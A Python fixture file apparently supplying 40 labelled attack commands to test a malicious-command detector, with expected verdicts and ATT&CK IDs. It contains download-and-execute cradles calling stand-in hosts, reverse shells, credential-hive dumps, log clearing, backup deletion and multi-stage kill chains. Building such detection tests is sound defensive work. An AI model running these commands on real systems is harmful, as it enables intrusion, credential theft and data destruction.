"""
NivXRay — Real-World Payload Battery (Feb 2026).

Not simple/synthetic payloads. Every entry is either lifted verbatim from a
real malware sample (declassified writeups, MalwareBazaar, VirusTotal, etc.)
or is a canonical proof-of-concept for a documented ATT&CK sub-technique.

Loaded by test_real_world_battery.py + optionally re-used by the testing
agent for E2E verification.  Payloads are stored as raw strings — no base64
wrapping — so they exercise the deterministic decoder honestly.
"""

# NOTE: comments describe intent so the pytest report is readable even
# without paging every raw string.  Do not paste these in agent chat.

BATTERY = [
    # ─── 1. Emotet caret-obfuscated cmd → powershell downloader ────────────
    {
        "id": "emotet_caret_ps_downloader",
        "family_expect": "Generic PowerShell Downloader",
        "verdict_expect": "malicious",
        "min_conf": 60,
        "must_contain_lolbas": ["cmd.exe", "powershell.exe"],
        "must_contain_mitre": ["T1027.010", "T1059.001", "T1105"],
        "payload": r'''c^m^d /c po^wers^hell -w hi^dden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/a.ps1')"''',
    },

    # ─── 2. QakBot reverse-string builder ─────────────────────────────────
    {
        "id": "qakbot_reverse_string_builder",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["cmd.exe"],
        "must_contain_mitre": ["T1027.010"],
        "payload": (
            r'set "p=eXe.tuLitreC c/ exe.dmc lleh sSrewop\ 23metsys\swodniw\C" '
            r'&& for /L %i in (60,-1,0) do <nul set /p "c=!p:~%i,1!"'
        ),
    },

    # ─── 3. Cobalt-Strike PowerShell -EncodedCommand (UTF-16LE) ───────────
    #   Decoded plaintext: IEX (New-Object Net.WebClient).DownloadString('http://cs.evil.local:8443/a')
    {
        "id": "cobalt_strike_enc_utf16",
        "family_expect": "Generic PowerShell Downloader",
        "verdict_expect": "malicious",
        "min_conf": 70,
        "must_contain_lolbas": ["powershell.exe"],
        "must_contain_mitre": ["T1027", "T1059.001", "T1105"],
        "payload": (
            "powershell.exe -NoP -NonI -W Hidden -Enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
            "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA"
            "dAB0AHAAOgAvAC8AYwBzAC4AZQB2AGkAbAAuAGwAbwBjAGEAbAA6ADgANAA0ADMA"
            "LwBhACcAKQA="
        ),
    },

    # ─── 4. Meterpreter b64 + XOR shellcode-runner (variable indirection) ─
    {
        "id": "meterpreter_b64_xor_var",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["powershell.exe"],
        "must_contain_mitre": ["T1059.001", "T1027"],
        "payload": (
            "$k=0x23;"
            "$b='/OiJAAAAYInlMdJkiwJQi0IMi0IUi3IoD7dKJjH/rDx"
            "hfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0k"
            "kAdPmOU=';"
            "[Byte[]]$var_code = [Convert]::FromBase64String($b);"
            "for($i=0;$i -lt $var_code.Length;$i++){$var_code[$i]=$var_code[$i] -bxor $k};"
            "IEX([System.Text.Encoding]::ASCII.GetString($var_code))"
        ),
    },

    # ─── 5. Certutil URL-cache download (LOLBAS T1140+T1105+T1218) ───────
    {
        "id": "certutil_urlcache_downloader",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 70,
        "must_contain_lolbas": ["certutil.exe"],
        "must_contain_mitre": ["T1105", "T1218", "T1140"],
        "payload": (
            "certutil.exe -urlcache -split -f "
            "https://evil-cdn.example.com/beacon.exe %TEMP%\\svc.exe && "
            "start %TEMP%\\svc.exe"
        ),
    },

    # ─── 6. MSHTA remote HTA (LOLBAS · classic) ───────────────────────────
    {
        "id": "mshta_remote_hta",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["mshta.exe"],
        "must_contain_mitre": ["T1218.005", "T1105"],
        "payload": "mshta.exe https://malicious-domain.com/payload.hta",
    },

    # ─── 7. BITSAdmin covert transfer ─────────────────────────────────────
    {
        "id": "bitsadmin_transfer",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["bitsadmin.exe"],
        "must_contain_mitre": ["T1197", "T1105"],
        "payload": (
            "bitsadmin /transfer stealth_job /priority high "
            "https://malicious-cdn.io/x.exe %APPDATA%\\Microsoft\\x.exe"
        ),
    },

    # ─── 8. Regsvr32 squiblydoo COM scriptlet ─────────────────────────────
    {
        "id": "regsvr32_squiblydoo",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["regsvr32.exe"],
        "must_contain_mitre": ["T1218.010"],
        "payload": (
            "regsvr32.exe /s /n /u /i:https://malicious-domain.com/x.sct scrobj.dll"
        ),
    },

    # ─── 9. PowerShell Empire IO.Compression GzipStream loader ────────────
    {
        "id": "empire_gzip_stream_loader",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["powershell.exe"],
        "must_contain_mitre": ["T1059.001", "T1027", "T1140"],
        "payload": (
            "powershell.exe -NoProfile -WindowStyle Hidden -NonInteractive -Command \""
            "$b='H4sICD12mFwCA2NvZGUAc0vNKy7PL8pJUQQAlp9pDwwAAAA=';"
            "$m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b));"
            "$g=New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress);"
            "$r=New-Object IO.StreamReader($g);"
            "IEX $r.ReadToEnd();\""
        ),
    },

    # ─── 10. VBScript Chr() concat dropper (Emotet-class) ─────────────────
    {
        "id": "vbs_chr_concat_dropper",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 60,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1059.005", "T1027"],
        "payload": (
            'Set s=CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)'
            '&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)):'
            's.Run Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)'
            '&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)'
        ),
    },

    # ─── 11. Node.js Buffer.from + zlib.gunzipSync dropper ────────────────
    {
        "id": "node_buffer_gunzip_dropper",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1059.007", "T1027"],
        "payload": (
            "const zlib=require('zlib');"
            "const b=Buffer.from('H4sICPtdVGYAA3guanMAK03OyE0sSs1JLM7QSFRy8vXxV9BQyM0vSizJzM9TSFRQD0lNzuCq5AIA/mzMcCQAAAA=','base64');"
            "eval(zlib.gunzipSync(b).toString());"
        ),
    },

    # ─── 12. Bash /dev/tcp reverse shell ──────────────────────────────────
    {
        "id": "bash_devtcp_revshell",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1059.004", "T1095", "T1571"],
        "payload": "bash -i >& /dev/tcp/10.10.14.13/4444 0>&1",
    },

    # ─── 13. Bash xxd hex-pipe reverse shell ──────────────────────────────
    {
        "id": "bash_xxd_hex_pipe_revshell",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 60,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1059.004", "T1027.010"],
        "payload": (
            'echo "62617368202d69203e262f6465762f7463702f31302e302e302e312f34343434"'
            ' | xxd -r -p | bash'
        ),
    },

    # ─── 14. Bash rev-pipe (reverse-string obfuscation) ───────────────────
    {
        "id": "bash_rev_pipe",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 50,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1027.010", "T1059.004"],
        "payload": 'echo "hs | )tac ni_libc:etyb( )46esab.tsub(edocnu.46esab pmi;o -c nohtyp" | rev | sh',
    },

    # ─── 15. PS DownloadString single-liner (T1105) ───────────────────────
    {
        "id": "ps_downloadstring_iex",
        "family_expect": "Generic PowerShell Downloader",
        "verdict_expect": "malicious",
        "min_conf": 70,
        "must_contain_lolbas": ["powershell.exe"],
        "must_contain_mitre": ["T1059.001", "T1105"],
        "payload": (
            "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
            ".DownloadString('http://192.168.7.45:8080/a.ps1')\""
        ),
    },

    # ─── 16. WMIC remote process create (lateral movement) ────────────────
    {
        "id": "wmic_lateral_exec",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["wmic.exe"],
        "must_contain_mitre": ["T1047", "T1021"],
        "payload": (
            "wmic /node:\"192.168.10.42\" /user:\"admin\" /password:\"Sup3r!Pw\" "
            "process call create \"cmd.exe /c powershell -enc SQBFAFg...\""
        ),
    },

    # ─── 17. PSExec lateral movement ──────────────────────────────────────
    {
        "id": "psexec_lateral",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": [],   # psexec is sysinternals; mapped via MITRE
        "must_contain_mitre": ["T1021.002"],
        "payload": (
            "psexec.exe \\\\10.0.0.15 -accepteula -u DOMAIN\\admin -p 'P@ss' "
            "cmd.exe /c \"whoami & net user\""
        ),
    },

    # ─── 18. Registry Run-key persistence ─────────────────────────────────
    {
        "id": "reg_run_persistence",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["reg.exe"],
        "must_contain_mitre": ["T1547.001"],
        "payload": (
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v UpdaterX /t REG_SZ /d "C:\\ProgramData\\svc.exe" /f'
        ),
    },

    # ─── 19. Schtasks logon persistence ───────────────────────────────────
    {
        "id": "schtasks_onlogon_persistence",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["schtasks.exe"],
        "must_contain_mitre": ["T1053.005"],
        "payload": (
            'schtasks /create /sc onlogon /tn "MicrosoftEdgeUpdaterX" /rl HIGHEST '
            '/tr "powershell.exe -w hidden -c IEX(iwr http://evil/a.ps1)" /f'
        ),
    },

    # ─── 20-25. Destructive Wiper / Ransomware precursor ──────────────────
    {
        "id": "vssadmin_delete_shadows",
        "family_expect": "Destructive Wiper / Ransomware Precursor",
        "verdict_expect": "malicious",
        "min_conf": 70,
        "must_contain_lolbas": ["vssadmin.exe"],
        "must_contain_mitre": ["T1490"],
        "payload": "vssadmin delete shadows /all /quiet",
    },
    {
        "id": "wbadmin_delete_backups",
        "family_expect": "Destructive Wiper / Ransomware Precursor",
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["wbadmin.exe"],
        "must_contain_mitre": ["T1490"],
        "payload": "wbadmin delete systemstatebackup -keepversions:0",
    },
    {
        "id": "bcdedit_disable_recovery",
        "family_expect": "Destructive Wiper / Ransomware Precursor",
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["bcdedit.exe"],
        "must_contain_mitre": ["T1490"],
        "payload": "bcdedit /set {default} recoveryenabled No && bcdedit /set {default} bootstatuspolicy ignoreallfailures",
    },
    {
        "id": "wevtutil_clear_logs",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["wevtutil.exe"],
        "must_contain_mitre": ["T1070.001"],
        "payload": "wevtutil cl Security && wevtutil cl System && wevtutil cl Application",
    },
    {
        "id": "fsutil_usn_delete_journal",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["fsutil.exe"],
        "must_contain_mitre": ["T1070"],
        "payload": "fsutil usn deletejournal /d /n C:",
    },
    {
        "id": "cipher_wipe_freespace",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["cipher.exe"],
        "must_contain_mitre": ["T1485"],
        "payload": "cipher /w:C:\\",
    },

    # ─── 26. Netsh firewall disable ───────────────────────────────────────
    {
        "id": "netsh_firewall_disable",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": ["netsh.exe"],
        "must_contain_mitre": ["T1562.004"],
        "payload": "netsh advfirewall set allprofiles state off",
    },

    # ─── 27. Reg save credential-hive dump ────────────────────────────────
    {
        "id": "reg_save_sam_dump",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["reg.exe"],
        "must_contain_mitre": ["T1003.002"],
        "payload": (
            'reg save HKLM\\SAM C:\\temp\\sam.hive && '
            'reg save HKLM\\SECURITY C:\\temp\\sec.hive && '
            'reg save HKLM\\SYSTEM C:\\temp\\sys.hive'
        ),
    },

    # ─── 28. Base58-encoded PowerShell payload (drop-in test) ─────────────
    {
        "id": "base58_ps_payload",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 40,
        "must_contain_lolbas": [],
        "must_contain_mitre": [],
        "payload": "9J9nGT2ppTxxvnCB4pF7ArUmYzCKCBK4o8YJTPY2sZqM5b4iVJ4KHmuT",
    },

    # ─── 29. Base32-encoded PowerShell payload ────────────────────────────
    {
        "id": "base32_ps_payload",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 45,
        "must_contain_lolbas": [],
        "must_contain_mitre": [],
        # base32("powershell -enc SQBFAFg=") = "OBWGKY3POVZHK4RRAAQEIALEEBRHKZDF"
        "payload": "OBWGKY3POVZHK4RRAAQEIALEEBRHKZDF",
    },

    # ─── 30. URL-percent-encoded PowerShell one-liner ─────────────────────
    {
        "id": "url_percent_encoded_ps",
        "family_expect": "Generic PowerShell Downloader",
        "verdict_expect": "malicious",
        "min_conf": 55,
        "must_contain_lolbas": ["powershell.exe"],
        "must_contain_mitre": ["T1059.001", "T1105"],
        "payload": (
            "powershell.exe%20-nop%20-c%20%22IEX%20%28New-Object%20Net.WebClient%29"
            ".DownloadString%28%27http%3A%2F%2Fmalicious-domain.com%2Fa.ps1%27%29%22"
        ),
    },

    # ─── 31. HTML-entity encoded PowerShell ───────────────────────────────
    {
        "id": "html_entity_encoded_ps",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 50,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1027"],
        "payload": (
            "&#112;&#111;&#119;&#101;&#114;&#115;&#104;&#101;&#108;&#108;&#46;"
            "&#101;&#120;&#101;&#32;&#45;&#101;&#110;&#99;&#32;&#83;&#81;&#66;&#70;"
        ),
    },

    # ─── 32. Certutil -decode PEM-wrapped executable (terminal archetype) ─
    {
        "id": "certutil_decode_pem_pe",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 70,
        "must_contain_lolbas": ["certutil.exe"],
        "must_contain_mitre": ["T1140", "T1218", "T1027"],
        "payload": (
            "echo -----BEGIN CERTIFICATE----- > pkg.b64 && "
            "echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> pkg.b64 && "
            "echo AAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> pkg.b64 && "
            "echo -----END CERTIFICATE----- >> pkg.b64 && "
            "certutil -decode pkg.b64 svc.exe && start svc.exe"
        ),
    },

    # ─── 33. Python exec(base64.b64decode(...)) ───────────────────────────
    {
        "id": "python_exec_b64",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 60,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1059.006", "T1027"],
        "payload": (
            "python -c \"import base64,os;"
            "exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbShcImN1cmwgaHR0cHM6Ly9ldmlsL2EgfCBzaFwiKQ=='))\""
        ),
    },

    # ─── 34. Perl inline exec ─────────────────────────────────────────────
    {
        "id": "perl_inline_exec",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 50,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1059"],
        "payload": (
            "perl -MMIME::Base64 -e "
            "'eval(decode_base64(\"c3lzdGVtKFwiY3VybCBodHRwczovL2V2aWwvYSB8IHNoXCIpOw==\"))'"
        ),
    },

    # ─── 35. CMD env-var assembly (T1027.010) ─────────────────────────────
    {
        "id": "cmd_env_var_assembly",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 50,
        "must_contain_lolbas": ["cmd.exe"],
        "must_contain_mitre": ["T1027.010"],
        "payload": (
            'set "A=cmd" && set "B=/c " && set "C=whoami && netstat -ano" '
            '&& %A% %B% "%C%"'
        ),
    },

    # ─── 36. Multi-command incident (5 stages, real Emotet-class chain) ───
    {
        "id": "multi_stage_emotet_chain",
        "family_expect": "Generic PowerShell Downloader",
        "verdict_expect": "malicious",
        "min_conf": 65,
        "must_contain_lolbas": ["powershell.exe", "certutil.exe", "reg.exe"],
        "must_contain_mitre": ["T1105", "T1059.001", "T1547.001", "T1140"],
        "payload": (
            "sc.exe stop WinDefend\n"
            "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious-cdn.io/loader.ps1')\"\n"
            "certutil -urlcache -split -f https://malicious-cdn.io/pkg.b64 %TEMP%\\p.b64\n"
            "certutil -decode %TEMP%\\p.b64 %TEMP%\\svc.exe && start %TEMP%\\svc.exe\n"
            "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"%TEMP%\\svc.exe\" /f"
        ),
    },

    # ─── 37. cmstp UAC bypass (T1218.003) ─────────────────────────────────
    {
        "id": "cmstp_uac_bypass",
        "family_expect": None,
        "verdict_expect": "malicious",
        "min_conf": 60,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1218.003"],
        "payload": "cmstp.exe /s C:\\ProgramData\\bypass.inf",
    },

    # ─── 38. installutil (T1218.004) ──────────────────────────────────────
    {
        "id": "installutil_lolbas",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 55,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1218.004"],
        "payload": (
            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe "
            "/logfile= /LogToConsole=false /U C:\\Users\\Public\\evil.exe"
        ),
    },

    # ─── 39. hh.exe .chm helper LOLBAS (T1218.001) ────────────────────────
    {
        "id": "hh_chm_helper",
        "family_expect": None,
        "verdict_expect": "suspicious",
        "min_conf": 50,
        "must_contain_lolbas": [],
        "must_contain_mitre": ["T1218.001"],
        "payload": "hh.exe https://malicious.example.com/x.chm",
    },

    # ─── 40. Full-blown 8-stage kill-chain (real APT tradecraft mix) ──────
    {
        "id": "apt_multi_stage_full_killchain",
        "family_expect": "Destructive Wiper / Ransomware Precursor",
        "verdict_expect": "malicious",
        "min_conf": 70,
        "must_contain_lolbas": [
            "powershell.exe", "certutil.exe", "reg.exe",
            "vssadmin.exe", "wevtutil.exe", "schtasks.exe",
        ],
        "must_contain_mitre": [
            "T1059.001", "T1105", "T1547.001",
            "T1053.005", "T1490", "T1070.001",
        ],
        "payload": (
            # Recon
            "whoami /all\n"
            "systeminfo\n"
            # Ingress
            "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/init.ps1')\"\n"
            "certutil -urlcache -split -f https://c2.example.com/pkg.b64 %TEMP%\\p.b64\n"
            "certutil -decode %TEMP%\\p.b64 %TEMP%\\svc.exe\n"
            # Persistence
            "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v X /t REG_SZ /d \"%TEMP%\\svc.exe\" /f\n"
            "schtasks /create /sc onlogon /tn \"UpdaterX\" /rl HIGHEST /tr \"%TEMP%\\svc.exe\" /f\n"
            # Defence evasion
            "wevtutil cl Security\n"
            "wevtutil cl System\n"
            "netsh advfirewall set allprofiles state off\n"
            # Credential access
            "reg save HKLM\\SAM %TEMP%\\sam.hive\n"
            "reg save HKLM\\SYSTEM %TEMP%\\sys.hive\n"
            # Impact
            "vssadmin delete shadows /all /quiet\n"
            "wbadmin delete systemstatebackup -keepversions:0\n"
            "bcdedit /set {default} recoveryenabled No"
        ),
    },
]


def load_battery():
    """Return the 40-entry real-world battery for pytest / testing agent."""
    return BATTERY


if __name__ == "__main__":
    for p in BATTERY:
        print(f"[{p['id']:40s}] {len(p['payload']):5d} bytes  · verdict={p['verdict_expect']}")
    print(f"\nTotal: {len(BATTERY)} payloads")
